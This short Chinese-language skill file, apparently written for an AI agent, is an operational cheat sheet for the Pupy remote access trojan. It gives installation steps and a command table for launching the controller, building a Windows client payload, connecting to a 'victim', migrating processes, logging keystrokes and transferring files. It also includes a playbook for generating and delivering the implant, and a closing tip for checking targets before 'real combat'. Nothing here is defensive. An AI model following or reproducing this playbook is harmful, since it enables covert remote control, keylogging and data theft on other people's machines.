---
name: pupy-rat
description: Pupy: 跨平台远控上线。信号:c2,命令控制,启动控制端,生成客户端,进程迁移。
---

# Pupy

- 攻击大类:C35 C2框架与远控
- 上游仓库:https://github.com/n1nj4sec/pupy
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/n1nj4sec/pupy && cd pupy && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./pupysh.py` | 启动控制端 |
| `gen -f client -O windows -A x64` | 生成客户端 |
| `connect victim` | 上线 |
| `run migrate` | 进程迁移 |
| `run keylogger_start` | 键盘记录 |
| `download / upload` | 文件传输 |

## 攻击场景 Playbook

### 跨平台远控上线

```bash
pupysh> gen -f client -O windows -A x64 -o w.exe
# 投递后 pupysh> sessions; interact <id> 进入
```

## 注意事项

纯 Python 实现全内存加载;项目维护放缓,实战前验证目标 Python 兼容性。
